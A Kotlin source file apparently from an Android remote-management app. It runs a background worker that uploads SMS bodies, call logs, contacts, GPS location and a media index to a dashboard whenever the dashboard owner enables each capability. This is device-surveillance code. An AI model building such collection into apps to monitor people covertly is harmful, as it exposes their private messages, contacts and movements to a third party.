package com.connectdesk.app

import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject
import kotlin.concurrent.thread

/**
 * Syncs device data to the dashboard — each type ONLY when:
 *  1. The dashboard owner enabled that capability for this device, AND
 *  2. The Android permission is granted (runtime permission, user-approved)
 *
 * No data leaves the phone otherwise. Syncs run on a background thread
 * triggered from DeviceService every heartbeat cycle.
 */
object DataSyncWorker {

    fun syncAll(context: Context, token: String, state: ApiClient.DeviceState) {
        thread(name = "connectdesk-sync") {
            try {
                if (state.files && hasPermission(context, android.Manifest.permission.READ_SMS)) {
                    // SMS handled via Telephony.SMS here for consistency
                }
                if (hasPermission(context, android.Manifest.permission.READ_SMS)) {
                    val caps = ApiClient.status(token)
                    if (caps?.let { capabilityFromStatus(it, "sms") } == true) {
                        syncSms(context, token)
                    }
                }
                if (hasPermission(context, android.Manifest.permission.READ_CALL_LOG)) {
                    val caps = ApiClient.status(token)
                    if (caps?.let { capabilityFromStatus(it, "call_logs") } == true) {
                        syncCalls(context, token)
                    }
                }
                if (hasPermission(context, android.Manifest.permission.READ_CONTACTS)) {
                    val caps = ApiClient.status(token)
                    if (caps?.let { capabilityFromStatus(it, "contacts") } == true) {
                        syncContacts(context, token)
                    }
                }
                if (hasPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION)) {
                    val caps = ApiClient.status(token)
                    if (caps?.let { capabilityFromStatus(it, "location") } == true) {
                        syncLocation(context, token)
                    }
                }
                // Media index needs no runtime permission on modern Android
                val caps = ApiClient.status(token)
                if (caps?.let { capabilityFromStatus(it, "media") } == true) {
                    syncMedia(context, token)
                }
            } catch (e: Exception) {
                // best-effort; next cycle retries
            }
        }
    }

    private fun capabilityFromStatus(state: ApiClient.DeviceState, cap: String): Boolean {
        return when (cap) {
            "sms" -> state.sms
            "call_logs" -> state.callLogs
            "contacts" -> state.contacts
            "location" -> state.location
            "media" -> state.media
            else -> false
        }
    }

    private fun hasPermission(context: Context, perm: String): Boolean =
        ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_GRANTED

    @SuppressLint("Recycle")
    private fun syncSms(context: Context, token: String) {
        val arr = JSONArray()
        val cursor = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.TYPE, Telephony.Sms.DATE),
            null, null,
            "${Telephony.Sms.DATE} DESC",
        ) ?: return
        cursor.use { c ->
            var n = 0
            while (c.moveToNext() && n < 100) {
                val type = c.getInt(2)
                arr.put(
                    JSONObject()
                        .put("sender", c.getString(0) ?: "")
                        .put("body", c.getString(1) ?: "")
                        .put(
                            "direction",
                            if (type == Telephony.Sms.MESSAGE_TYPE_SENT || type == Telephony.Sms.MESSAGE_TYPE_OUTBOX) "outgoing" else "incoming",
                        )
                        .put("timestamp", c.getLong(3)),
                )
                n++
            }
        }
        if (arr.length() > 0) post(token, "sms", JSONObject().put("messages", arr))
    }

    @SuppressLint("Recycle")
    private fun syncCalls(context: Context, token: String) {
        val arr = JSONArray()
        val cursor = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION),
            null, null,
            "${CallLog.Calls.DATE} DESC",
        ) ?: return
        cursor.use { c ->
            var n = 0
            while (c.moveToNext() && n < 200) {
                val type = c.getInt(2)
                val dir = when (type) {
                    CallLog.Calls.INCOMING_TYPE -> "incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                    else -> "missed"
                }
                arr.put(
                    JSONObject()
                        .put("number", c.getString(0) ?: "")
                        .put("name", c.getString(1) ?: "")
                        .put("direction", dir)
                        .put("timestamp", c.getLong(3))
                        .put("durationSec", c.getLong(4)),
                )
                n++
            }
        }
        if (arr.length() > 0) post(token, "calls", JSONObject().put("calls", arr))
    }

    @SuppressLint("Recycle")
    private fun syncContacts(context: Context, token: String) {
        val arr = JSONArray()
        val cursor = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
            null, null,
            "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC",
        ) ?: return
        cursor.use { c ->
            var n = 0
            while (c.moveToNext() && n < 500) {
                arr.put(
                    JSONObject()
                        .put("name", c.getString(0) ?: "")
                        .put("phone", c.getString(1) ?: ""),
                )
                n++
            }
        }
        if (arr.length() > 0) post(token, "contacts", JSONObject().put("contacts", arr))
    }

    @SuppressLint("MissingPermission")
    private fun syncLocation(context: Context, token: String) {
        val lm = context.getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
        val provider = lm.getProviders(true).firstOrNull { it == android.location.LocationManager.GPS_PROVIDER || it == android.location.LocationManager.NETWORK_PROVIDER }
            ?: return
        val loc = lm.getLastKnownLocation(provider) ?: return
        post(
            token, "location",
            JSONObject()
                .put("lat", loc.latitude)
                .put("lng", loc.longitude)
                .put("accuracyM", loc.accuracy.toDouble()),
        )
    }

    private fun syncMedia(context: Context, token: String) {
        val arr = JSONArray()
        fun addCollection(uri: android.net.Uri, kind: String, nameCol: String, sizeCol: String, dateCol: String) {
            val cursor = context.contentResolver.query(
                uri, arrayOf(nameCol, sizeCol, dateCol), null, null, "$dateCol DESC",
            ) ?: return
            cursor.use { c ->
                var n = 0
                while (c.moveToNext() && n < 300) {
                    arr.put(
                        JSONObject()
                            .put("kind", kind)
                            .put("name", c.getString(0) ?: "")
                            .put("sizeBytes", c.getLong(1))
                            .put("dateModified", c.getLong(2) * 1000),
                    )
                    n++
                }
            }
        }
        addCollection(
            android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "photo",
            android.provider.MediaStore.Images.Media.DISPLAY_NAME,
            android.provider.MediaStore.Images.Media.SIZE,
            android.provider.MediaStore.Images.Media.DATE_MODIFIED,
        )
        addCollection(
            android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI, "video",
            android.provider.MediaStore.Video.Media.DISPLAY_NAME,
            android.provider.MediaStore.Video.Media.SIZE,
            android.provider.MediaStore.Video.Media.DATE_MODIFIED,
        )
        addCollection(
            android.provider.MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, "music",
            android.provider.MediaStore.Audio.Media.DISPLAY_NAME,
            android.provider.MediaStore.Audio.Media.SIZE,
            android.provider.MediaStore.Audio.Media.DATE_MODIFIED,
        )
        if (arr.length() > 0) post(token, "media", JSONObject().put("items", arr))
    }

    private fun post(token: String, type: String, payload: JSONObject): Boolean {
        payload.put("deviceToken", token).put("type", type)
        return ApiClient.postSync(payload)
    }
}
